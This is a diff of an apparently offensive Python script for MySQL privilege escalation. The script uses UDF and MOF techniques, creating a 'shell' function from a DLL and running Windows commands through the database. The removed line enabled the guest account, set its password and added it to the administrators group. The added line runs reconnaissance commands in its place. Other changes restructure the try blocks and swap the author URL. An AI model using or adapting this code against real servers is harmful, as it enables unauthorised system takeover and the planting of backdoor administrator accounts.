@@ -1,6 +1,6 @@
 #coding:UTF-8
 #Using for mysql promote privileges
-#Author 冰河/v5est0r http://wwww.binghesec.com
+#Author v5est0r http://wwww.zi0m.cn
 
 import pymysql,os,ConfigParser
 import sys
@@ -45,15 +45,15 @@ try:
     cursor.execute(sql_dump_usermof)
 except:
     pass
-    try:
-        cursor.execute(sql_dump_grouprmof)
-    except:
-        pass
-        try:
-            cursor.execute(sql_dump_lpk)
-            #cursor.execute(sql_dump_startup)
-        except:
-            pass
+try:
+    cursor.execute(sql_dump_grouprmof)
+except:
+    pass
+try:
+    cursor.execute(sql_dump_lpk)
+    #cursor.execute(sql_dump_startup)
+except:
+    pass
 sql_select_rootdir = 'select @@basedir'
 cursor.execute(sql_select_rootdir)
 res_rootdir = cursor.fetchall()
@@ -61,7 +61,7 @@ for row in res_rootdir:
     mysql_rootpath = "%s" % row
 
 sql_create_func = "create function shell returns string soname 'BingheSec.dll'"
-sql_exex_cmd = "select shell('cmd','ver&whoami&net user guest /active&net localgroup administrators guest /add&net user guest 789456123+abc&net localgroup administrators')"
+sql_exex_cmd = "select shell('cmd','ver&whoami&tasklist /svc&netstat -ano')"
 sql_select_ver = 'select version()'
 
 cursor.execute(sql_select_ver)
